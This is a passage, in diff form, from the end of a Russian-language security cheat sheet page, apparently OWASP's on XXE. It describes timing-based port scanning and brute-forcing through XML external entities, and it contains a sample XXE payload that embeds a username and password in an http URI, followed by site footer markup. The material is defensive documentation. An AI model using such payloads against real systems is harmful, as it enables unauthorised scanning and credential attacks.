+<p><strong>4) Основанное на времени</strong>: Иногда может быть сложно определить разницу между закрытыми и открытыми портами, поскольку результаты очень незначительны. Единственный способ с уверенностью узнать статус порта — взять несколько измерений времени, необходимого для достижения каждого хоста, затем проанализировать среднее время для каждого порта, чтобы определить его статус. Этот тип атаки будет сложно выполнить в сетях с высокой задержкой.</p>
+<h5 id="_34">Брутфорс<a class="headerlink" href="#_34" title="Permanent link">&para;</a></h5>
+<p><strong>Как только злоумышленник подтверждает возможность сканирования портов, выполнить брутфорс-атаку — вопрос встраивания <code>username</code> и <code>password</code> в схему URI (http, ftp и т.д.):</strong></p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;!DOCTYPE root [</span>
+<span class="cp"> &lt;!ENTITY user SYSTEM &quot;http://username:password@example.com:8080&quot;&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;user;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      ©Copyright <script>document.write(new Date().getFullYear())</script> - Cheat Sheets Series Team - This work is licensed under <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International</a>.
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.sections", "navigation.expand"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
